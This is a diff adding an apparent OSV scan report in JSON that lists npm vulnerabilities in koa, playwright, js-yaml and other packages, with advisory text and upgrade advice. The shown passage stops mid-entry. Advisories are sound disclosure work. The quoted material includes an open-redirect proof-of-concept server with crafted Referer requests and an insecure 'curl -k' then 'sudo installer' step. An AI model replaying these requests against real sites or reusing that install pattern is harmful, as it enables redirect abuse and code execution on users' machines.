@@ -1,0 +1,2117 @@
+{
+  "analyzedAt": "2025-12-17T20:07:21.603Z",
+  "source": "oderwat__vscode-indent-rainbow.osv.json",
+  "summary": {
+    "totalVulnerabilities": 22,
+    "uniqueVulnerabilities": 21,
+    "affectedPackages": 19,
+    "stalePackages": 22,
+    "stalePackagesOldFix": 14,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 2,
+      "LOW": 20
+    },
+    "recentVulnerabilities": 5,
+    "hasFixAvailable": 22
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-593f-38f6-jp5m",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-25200"
+      ],
+      "summary": "Inefficient Regular Expression Complexity in koa",
+      "details": "### Summary\nKoa uses an evil regex to parse the `X-Forwarded-Proto` and `X-Forwarded-Host` HTTP headers. This can be exploited to carry out a Denial-of-Service attack.\n\n### PoC\n\nComing soon.\n\n### Impact\nThis is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-02-12T19:23:09Z",
+        "modifiedDate": "2025-02-12T19:27:07.225487Z",
+        "daysSincePublished": 308
+      },
+      "affected": {
+        "package": "koa",
+        "version": "2.13.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2.13.1",
+        "fixedIn": "2.15.4",
+        "recommendation": "Upgrade to 2.15.4 or later",
+        "fixAvailableSince": "2025-02-12T19:27:07.225Z",
+        "daysSinceFix": 308,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-25200"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/koajs/koa"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/releases/tag/2.15.4"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-7mvr-c777-76hp",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:H/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-59288"
+      ],
+      "summary": "Playwright downloads and installs browsers without verifying the authenticity of the SSL certificate",
+      "details": "### Summary\nUse of `curl` with the `-k` (or `--insecure`) flag in installer scripts allows attackers to deliver arbitrary executables via Man-in-the-Middle (MitM) attacks. This can lead to full system compromise, as the downloaded files are installed as privileged applications.\n\n### Details\nThe following scripts in the `microsoft/playwright` repository at commit [`bee11cbc28f24bd18e726163d0b9b1571b4f26a8`](https://github.com/microsoft/playwright/commit/bee11cbc28f24bd18e726163d0b9b1571b4f26a8) use `curl -k` to fetch and install executable packages without verifying the authenticity of the SSL certificate:\n\n\n- [`packages/playwright-core/bin/reinstall_chrome_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_chrome_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_stable_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_dev_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_dev_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_stable_mac.sh)\n\nIn each case, the shell scripts download a browser installer package using `curl -k` and immediately install it:\n\n```shell\ncurl --retry 3 -o ./<pkg-file> -k <url>\nsudo installer -pkg /tmp/<pkg-file> -target /\n```\n\nDisabling SSL verification (`-k`) means the download can be intercepted and replaced with malicious content.\n\n### PoC\nA high-level exploitation scenario:\n\n1. An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)",
+      "cwes": [
+        {
+          "id": "CWE-347",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-10-14T18:30:36Z",
+        "modifiedDate": "2025-10-24T20:05:47Z",
+        "daysSincePublished": 64
+      },
+      "affected": {
+        "package": "playwright",
+        "version": "1.15.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.15.0",
+        "fixedIn": "1.55.1",
+        "recommendation": "Upgrade to 1.55.1 or later",
+        "fixAvailableSince": "2025-10-24T20:05:47.000Z",
+        "daysSinceFix": 54,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59288"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/microsoft/playwright/pull/37532"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/microsoft/playwright"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/microsoft/playwright/releases/tag/v1.55.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/microsoft/playwright/releases/tag/v1.56.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-5889"
+      ],
+      "summary": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-06-09T21:30:51Z",
+        "modifiedDate": "2025-06-11T20:54:10Z",
+        "daysSincePublished": 190
+      },
+      "affected": {
+        "package": "brace-expansion",
+        "version": "1.1.11",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.1.11",
+        "fixedIn": "2.0.2",
+        "recommendation": "Upgrade to 2.0.2 or later",
+        "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+        "daysSinceFix": 188,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.585717"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-grv7-fg5c-xmjg",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-4068"
+      ],
+      "summary": "Uncontrolled resource consumption in braces",
+      "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+      "cwes": [
+        {
+          "id": "CWE-1050",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-05-14T18:30:54Z",
+        "modifiedDate": "2024-07-15T22:12:28.795792Z",
+        "daysSincePublished": 582
+      },
+      "affected": {
+        "package": "braces",
+        "version": "3.0.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.0.2",
+        "fixedIn": "3.0.3",
+        "recommendation": "Upgrade to 3.0.3 or later",
+        "fixAvailableSince": "2024-07-15T22:12:28.795Z",
+        "daysSinceFix": 519,
+        "monthsSinceFix": 17,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/issues/35"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/pull/37"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/pull/40"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
+        },
+        {
+          "type": "WEB",
+          "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/micromatch/braces"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3xgq-45jj-v275",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-21538"
+      ],
+      "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+      "details": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-11-08T06:30:47Z",
+        "modifiedDate": "2025-05-19T19:56:26Z",
+        "daysSincePublished": 404
+      },
+      "affected": {
+        "package": "cross-spawn",
+        "version": "7.0.3",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.0.3",
+        "fixedIn": "7.0.5",
+        "recommendation": "Upgrade to 7.0.5 or later",
+        "fixAvailableSince": "2025-05-19T19:56:26.000Z",
+        "daysSinceFix": 212,
+        "monthsSinceFix": 7,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/moxystudio/node-cross-spawn"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-xvf7-4v9q-58w6",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25851"
+      ],
+      "summary": "Infinite loop in jpeg-js",
+      "details": "The package jpeg-js before 0.4.4 is vulnerable to Denial of Service (DoS) where a particular piece of input will cause the program to enter an infinite loop and never return.",
+      "cwes": [
+        {
+          "id": "CWE-835",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-06-11T00:00:17Z",
+        "modifiedDate": "2025-01-14T10:56:51.595721Z",
+        "daysSincePublished": 1285
+      },
+      "affected": {
+        "package": "jpeg-js",
+        "version": "0.4.3",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "0.4.3",
+        "fixedIn": "0.4.4",
+        "recommendation": "Upgrade to 0.4.4 or later",
+        "fixAvailableSince": "2025-01-14T10:56:51.595Z",
+        "daysSinceFix": 337,
+        "monthsSinceFix": 11,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25851"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpeg-js/jpeg-js/issues/105"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpeg-js/jpeg-js/pull/106"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpeg-js/jpeg-js/commit/9ccd35fb5f55a6c4f1902ac5b0f270f675750c27"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpeg-js/jpeg-js"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2860295"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JS-JPEGJS-2859218"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mh29-5h37-fv8m",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-64718"
+      ],
+      "summary": "js-yaml has prototype pollution in merge (<<)",
+      "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "cwes": [
+        {
+          "id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-11-14T14:29:48Z",
+        "modifiedDate": "2025-11-17T15:20:43Z",
+        "daysSincePublished": 33
+      },
+      "affected": {
+        "package": "js-yaml",
+        "version": "3.14.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.14.1",
+        "fixedIn": "4.1.1",
+        "recommendation": "Upgrade to 4.1.1 or later",
+        "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+        "daysSinceFix": 30,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodeca/js-yaml"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mh29-5h37-fv8m",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-64718"
+      ],
+      "summary": "js-yaml has prototype pollution in merge (<<)",
+      "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "cwes": [
+        {
+          "id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-11-14T14:29:48Z",
+        "modifiedDate": "2025-11-17T15:20:43Z",
+        "daysSincePublished": 33
+      },
+      "affected": {
+        "package": "js-yaml",
+        "version": "4.1.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.1.0",
+        "fixedIn": "4.1.1",
+        "recommendation": "Upgrade to 4.1.1 or later",
+        "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+        "daysSinceFix": 30,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodeca/js-yaml"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-jgmv-j7ww-jx2x",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-8129"
+      ],
+      "summary": "Koa Open Redirect via Referrer Header (User-Controlled)",
+      "details": "## Summary\nIn the latest version of Koa, the back method used for redirect operations adopts an insecure implementation, which uses the user-controllable referrer header as the redirect target.\n\n## Details\non the API document https://www.koajs.net/api/response#responseredirecturl-alt, we can see:\n\n**response.redirect(url, [alt])**\n```\nPerforms a [302] redirect to url.\nThe string \"back\" is specially provided for Referrer support, using alt or \"/\" when Referrer does not exist.\n\nctx.redirect('back');\nctx.redirect('back', '/index.html');\nctx.redirect('/login');\nctx.redirect('http://google.com');\n\n```\nhowever, the \"back\" method is insecure:\n\n- https://github.com/koajs/koa/blob/master/lib/response.js#L322\n```\n  back (alt) {\n    const url = this.ctx.get('Referrer') || alt || '/'\n    this.redirect(url)\n  },\n```\nReferrer Header is User-Controlled.\n\n\n## PoC\n\n**there is a demo for POC:**\n```\nconst Koa = require('koa')\nconst serve = require('koa-static')\nconst Router = require('@koa/router')\nconst path = require('path')\n\nconst app = new Koa()\nconst router = new Router()\n\n// Serve static files from the public directory\napp.use(serve(path.join(__dirname, 'public')))\n\n// Define routes\nrouter.get('/test', ctx => {\n  ctx.redirect('back', '/index1.html')\n})\n\nrouter.get('/test2', ctx => {\n  ctx.redirect('back')\n})\n\nrouter.get('/', ctx => {\n  ctx.body = 'Welcome to the home page! Try accessing /test, /test2'\n})\n\napp.use(router.routes())\napp.use(router.allowedMethods())\n\nconst port = 3000\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`)\n}) \n```\n**Proof Of Concept**\n```\nGET /test HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n\n\nGET /test2 HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n```\n![image](https://github.com/user-attachments/assets/03d1e61b-df97-4b42-a0c4-437bd17144db)\n\n![image](https://github.com/user-attachments/assets/f4e076e0-3853-4b7a-b4c0-bddf5b67631a)\n\n\n## Impact\nhttps://learn.snyk.io/lesson/open-redirect/",
+      "cwes": [
+        {
+          "id": "CWE-601",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-07-29T19:11:25Z",
+        "modifiedDate": "2025-07-30T14:14:46Z",
+        "daysSincePublished": 141
+      },
+      "affected": {
+        "package": "koa",
+        "version": "2.13.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2.13.1",
+        "fixedIn": "2.16.2",
+        "recommendation": "Upgrade to 2.16.2 or later",
+        "fixAvailableSince": "2025-07-30T14:14:46.000Z",
+        "daysSinceFix": 140,
+        "monthsSinceFix": 4,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/security/advisories/GHSA-jgmv-j7ww-jx2x"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54420"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/issues/1892"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/issues/1892#issue-3213028583"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/commit/422c551c63d00f24e2bbbdf492f262a5935bb1f0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/koajs/koa"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.317514"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.317514"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.619741"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-x2rg-q646-7m2v",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-32379"
+      ],
+      "summary": "Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function",
+      "details": "### Summary\nIn koa < 2.16.1 and < 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.\n\n### Patches\nThis issue is patched in  2.16.1 and 3.0.0-alpha.5.\n\n### PoC\nComing soon...\n\n### Impact\n1. Redirect user to another phishing site\n2. Make request to another endpoint of the application based on user's cookie\n3. Steal user's cookie",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-04-09T13:00:07Z",
+        "modifiedDate": "2025-04-09T20:29:43Z",
+        "daysSincePublished": 252
+      },
+      "affected": {
+        "package": "koa",
+        "version": "2.13.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2.13.1",
+        "fixedIn": "2.16.1",
+        "recommendation": "Upgrade to 2.16.1 or later",
+        "fixAvailableSince": "2025-04-09T20:29:43.000Z",
+        "daysSinceFix": 251,
